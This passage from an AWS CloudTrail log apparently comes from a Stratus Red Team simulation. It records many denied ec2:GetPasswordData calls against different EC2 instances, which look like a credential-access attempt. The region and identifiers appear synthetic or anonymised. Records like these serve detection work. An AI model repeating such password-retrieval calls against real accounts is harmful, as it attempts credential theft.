\"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: PYyJbyooe4ak6qMgask39P0gOiQ5cBbfHnbhq03IU21H-MyHGDAfqvf1w1AR8zTvfPeYrt-zWX8A_TTHbJHBMOEBBMVtdxHIVHnIPbOsU36JnpqjT4T1uarOliX6ViEkBvKm9wtPKFj4XK6xv49tdy8WomHqDsukCmOldH5KOIBDFDdLZvvsPotW_GA-HKR-FjVoRi7l7HCHDad5M8ruK1g8a8nUBEIKqbOexvpZiyJF9yO0I05X7nR81yYvKDAN4Y0n_VKUlMyS8nLYTWJh5RCzweie8uT3unJDHS24dvk51sEkrmQvh3Kpw5EADofCBWiTabx6zdoPFd81WpfOayEli1n2FI5zzeROdvIbiNlvyKjVTmcgsXYphfjbgOLeSU6bMF68_SPURL1Ua23ZkwkebQRav40J4rrnFgVWHuZbvAeULyWDEDDx_10jB7leB9Z6yAVlBqL8RNb-xsAKnk5dmvqsCsT5P53m9kC_g4389oV0LUahYu9c9fIkrj_3DJ3mZztALQl7l6fIkT_npQfg-QqfZx--t2sQW1gfIKQPXkxmsdQhdvXWik74wd6t_N4\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b8a37387-6dd5-49a1-b55a-a491a0bb85b0\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"8fc4e269-7b8e-4123-92a4-0821283c590f\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-qivk0oox9ac6grv7\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: FvDsnEXWiuIoaTAltof47EUVg-dVIlwI4emrpGlLM9ElSpuAjv-7LPppbkJa9spadx-PCqvteb8TjhsI6AiunSA0tCPufgOiRyIioV_HMK1Bpj5ieQYhUIBJ-xUJx3BlwDu3aGPWRyBJNe0J3aqqaPFm5uIA6OmeQol_Qi_LCbYkcJUbGuWqxg85kE4cP42Ev9_dZW3xvUQgbvEKZGVbeVxQJQTIDChBXifHRxOtUaykG196i6lg6xR396OSGs4mfq-bdxNKYAKssZaOvPOqqf-43f260zDUmI5OohcgrPSfNBrGIeXzMUChBd2fNzIXA8-8InOL1OqD55FB_cDL2rhx3hqdCB1tOhxjUNfZTAAsfOeD3QurNUew8oEUP2LE4x74vtWeSR5JiZMWGFPWxoX9cycXnJ9enLY5JePWDEmkF0toZ0aFzAYha08QhpXD1YEVWu9C8ZkW4aa998ZX6C2nP7GInZtN8CBM4BlSi5NAHYpZGUl_PH7YWlLGq54JOMh-JbQ_FiGms16beBvJqsJyS5CGvYoEEnjtTEYDrqxULD0UhxUN8LsJmYOZxw9FrOI\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c1e66f32-ddf1-4e85-9a5c-9b11b09e2d06\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"98a10bb3-07db-4576-9edf-73d8d2e37460\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-n2d16wuklpqfdsr9\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: aTrFQVq-TlNHs1qYAG80Y-kgjzT_ie6zqlFDxIfbXqvyqCsVEmFK6CieWIHOBEhcMEsDfmEpudkmch0OKIeZHgCYKrzIzp1aoHfAUFeUvUaAbq4SZLlLjeCOpOrFgCLROeGzk2w55VAxsC0JdhAtI-IoWOsE3CjBDJ2oJO8KpFy1nLVpUA1VU_sJ0cJudc2a381zduNnnKJufvt_xr19glMtN__HERdIWJguV9NinCtviEFOa4-Ipzj7Qd6zuQ_rYAEmM9jkAuEdOfl-1fBJ1rouciEwao3Rvpz8mMV3bkzVEb8pTKIn5X5vp57v7Xapb8ZP08UpGeswPz1u5ybB__EgmHcW8JS0Y_iWybVslZTruLarO5JbkIlv9hE7viVbyfvXmnbrnlRQHYuyS3Rt6aYmvdwqqMjd918qvpI1rWeILu2URb5M4dK1vNA-9AxvAUMZSGViaJxncd0rcnDPNNUaSQX8bjetu15TeLS1G0N4fdqD-lcY0Dc_NgjNwYTcg8uXXXLLUKgJ1lKpkeEeSXNImo2X_DYTwCj9xkLPZ2qlckqNeLokUqdWl6sDZpHAyPY\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1078f3f3-e72f-42bd-a0c8-7f321b5fce0b\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"0bac5486-48ac-4ed5-b3a9-c094ee3a7304\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-bykprumj5lnfe4oh\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: IgBTWD-QgF4jCm2kuMMIXUGemfMfC7Hd7-UTvXmtYd4amt7MbUaC1FT4ne5XMwGaOq59YgFlane0ICbGs5Fy_zp37XvFqEVbrlu16lxiqVhgghuL6bH2jfBuuqWOGrfFNDbgXSNhZNHhN8pQ4Zhg_bHJi1jcx2XYlnN-BKy2_5vRT68-6xVl-D7MpyCh-J4PeuiyIJDwSWgT3UHzfMapPfMVRUetYSgGeub_sxMswfiR1dxD3PaUgubNNzjiTIeoElqxdELcDE_1V0RC2hKxuq1-kj5hXl4_hEzmuicGynwhkpXpP8W6u8xq-S2v-of5N5uBeTafwaDAtGIFprBp8smR6X3OeyB72nZVeyyaeIlL3uD2WkhX0da21OOGYRDTwbRBazStsugyvY4MnJWu5PCk0q6XHptm6qyL8nuUfZUkp-NQp35CKx9HaBsuLdvFe8dpGIwy5DlUes3T4IqITcZa2tA45xfeGAqo93G0LRZgQ3PMaJvTqW5hgN_6XXvt1_P3B9S6SCVMyR7Gu5mdG6fjbDKtIbWfeFz17Wd0fDSHfoaT1plivwSgZrkgnioCFQ\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"735eae92-16e3-469c-b454-4507c47aadcb\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"b195f9db-6777-41a9-8797-2df84ebb07dc\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-dcw41yq2wp8h1d58\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: 3Whk6y4yZdhA0PAEz88EFn9PqfvCo1S8surcpaXE6332jpdvRht6VTm3WWdOCkQ2mUq-zXlY1GimOJW6TJC9SkPtlBUAH5KxOFAQPMymWzNgU606sUYH41P7t63dp_F9_pVVO3gj22FW0qv1ZKHIIayypQ33bHS8lT3FQgqZzy6mntCT6OVSYJ5KiZEMmPiMLv8nVcGPoKHQErgjMcXWtkSuuI4tq2xhQBjdJlWgHDNv1Wn0M1RYy7_WKYkgCsoGlWSb10XMexgwl1dpmhODFZMA-hBbQZC_S9tKE3sTsuIppvqIW_SFY9WLdeI0_GRtjBt9hHNKBFr_V4GmNFapSDSMjt-w_OeWAC4MqmeGR_adqtMSIiamRHXtHfoEK-0M3c_HCIAl14XBPg4pKnCZiCutGk6ak0AVJmjz7iBWtkduRfBy1yk_7iXypjmLkUC2dCGPe3NYIm-hYMrlbqpFnZmyQf54by9MLj_I2h2Rjf0RXoRhFnwURyHtO_D9-jsWNfO-qgq0VKCg1gqFv5NUYfUQKb8CNALzxCCEjQxrgT-nkftGRxBNpLSs7CEwkyqcPg\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"73f28e1e-7fe0-40d2-94a4-cf42930e8b0a\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"de6fa24d-5054-4525-abe3-a210b4993b1a\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-okja04dckx6yg2uq\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: XsZyApBJAXhkSm43yz8Osvyv013N5Y2d1rnNlbOkkajw43v_w0IpDACr9S1GlpC_FLYISw3CunlllRJn4Q5GZJX-sS88rpWFIWTksDCKwb_a0hpbcNTqERnL18B_VOC-aOfl1QyYqmYDcGKISJl8jp5_uUMV5A-IFYEMGskUfbxpQE1rtIWCrXGPPnhWQn9gHA5eBhZo63LTdhMHKJenjj592AhJ__LaXaxeg-iW5p9V96uP9nTGiVx529QZlVPNWVmL0w6E5Ub2r7IKYQkE3SXYa6bs6IhquB4MAt8JMnO0YaPRnEUxVOdBPa4isE0Bgl1C5-8NQZ3uSPQiu9o-udWYVKbx0xk-jlLz4xXbAUsCZnGAsgFf7WOPg2icEvol6a5a-cAx3OQd_-BAI6rD4OdquHxo5ddPIzGsB8rDfGfrh7h4-JiAxTWVJ7ZlFC7sHcu57SSceE05R7ez9x9weIbeqmVz5TFLYnA6i4jyI0cRAaZYZ4PWG3A_dH6K7caomOrHVcayeV1H88kfma5DprPaMyo-hIAewgXrmSQsIou95sA3P8WLBtUXI4rqUC6vevg\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a8d8ee73-2a80-4d03-ae6c-42e2964a5e43\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"a14a2932-ca5b-4aaf-89fc-c4d66708fc61\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-8hy3natzpp4ef7ri\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: SkMlzz8Ec9AftDBkf302YkfKSCGS5zriIUZMQj4UAaXyX5B74Fg1f2f_IgZ6EdUNcmVr9A9OzxE9WmNikuJyWNRCX5Mjy_HRBg6VrxjWuSoUPBll0nWbIww-1NehYMVHla3eLDBA2KUsuE0KJ0ZAa2Cmy1LsT6kmbQ3PHK0a2INProm2fWi_k33oJXOTapMy5V4eVKIIWsCxWrFHO7o1E72cORK789yeKavJsP86tYGHdzssYRpnNYK-4y_YEphKj3Kc5NeOs2thecEMXiLPyPXJYzlG3hzDmd3vU-sgbC7t3uCPMuw0mdRWvd9QaNKp57dAP1Bl3CH6CEo2iGuftLyCA32dzTpAG1khB_2ct9Yodq28M7j4Cp5hC0q-IDpUol4hUjeoxN7QLFzrn6IpFuvP18PlJY2VyrMS05Mc9-Pv0HW6cen1p3ooH0qHAlvsG5LO1aNX0xacTlHAthoIjziAAXKD2AQBVtbo4rh1ds67tcLvaGZGwhv_uyziy-UYeBU_ENloIGFMmD44m4leqoXQaessC56tbFWmJEseRQtHxuA0rslcPW0l2Y4EHQ0Hdg\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"afcc764e-2db4-4fe2-aa74-85d01843d7ca\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"36fd0bf3-e2b7-43af-bec6-dd9df405c462\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-ymn0oq6iadzm0v0t\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the ec2:GetPasswordData action. Encoded authorization failure message: l58oQoHuiZkxwnQ_NKmt61fv2TTDkDEIIZRKFdxXk1cbyA_Mz38ZetF794KYJVPv9zh-UC3ZtvX1WJJnAKIZXfjA9Cy1i8lSj7zHv03E2MQ6w6I16hErXuvfbNCOIGWskZ2_H_-p16hqtPGz38n9ZU9BTXPUScqUcA9u2vi4aHfOyqBJTl85vPXl0PNX0rSCNea01NDzwQrdxme2UyAiuFEa4CZceqFpahDKOA5S3tZm2OzBJaZdeBYTgUwlcJYmM6iEXiC6ZGJsi3IV-rcg3WGMFogLXp_tQTlfMcjiPqO9v-LGyypMT3aVCWfzVTnJrDk-7-S7ue7zuTlN8y9LHWTaQvZFf6vAMEe5o8DG-W5cEBoQu5BgdC2yLJk99q1wNM1hCM6xSx9MI1m3Z4FYQkfTg6okRUBJiXClAlWVDXyS8r6KqAog1bNB3XorSP5TE9FgEq7stZ0DUzNvYqHtkkEEkfS1PWmsxPFBm_ew1NPvAptqzn7dci-Xo1XcqWFxqDcQEdblBhZGweU9OodEznDv-CkI-iO54_Zn-fMR0WP58pSgNxiP2x00PR2lbC2WoOly\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b5da67b9-87fa-4151-bd9a-818f3237fb91\",\n      \"eventName\": \"GetPasswordData\",\n      \"eventSource\": \"ec2.amazonaws.com\",\n      \"eventTime\": \"2024-07-30T21:31:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"457448411975\",\n      \"requestID\": \"a7cf65c0-a900-418b-99ab-a5d2ec35eed5\",\n      \"requestParameters\": {\n         \"instanceId\": \"i-l2yrvbrcwc3ytkcz\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"200.249.253.51\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.apiso-northsouth-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_5c59eb79-6dac-405c-a4c4-e19aec03c666\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIANQQHHS551LWULIWD\",\n         \"accountId\": \"457448411975\",\n         \"arn\": \"arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000\",\n         \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY:aws-go-sdk-1722375070115152000\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-07-30T21:31:15Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"sessionIssuer\": {\n               \"accountId\": \"457448411975\",\n               \"arn\": \"arn:aws:iam::457448411975:role/stratus-red-team-ec2-get-password-data-role\",\n               \"principalId\": \"AROAMLQ9F6KHQ07JKA0WY\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-get-password-data-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"apiso-northsouth-3r\",\n      \"errorCode\": \"Client.UnauthorizedOperation\",\n      \"errorMessage\": \"You are not authorized to perform this operation. User: arn:aws:sts::457448411975:assumed-role/stratus-red-team-ec2-get-password-data-role/aws-go-sdk-1722375070115152000 is not authorized to perform: ec2:GetPasswordData on resource: arn:aws:ec2:apiso-northsouth-3r:457448411975:instance/* because no identity-based policy allows the 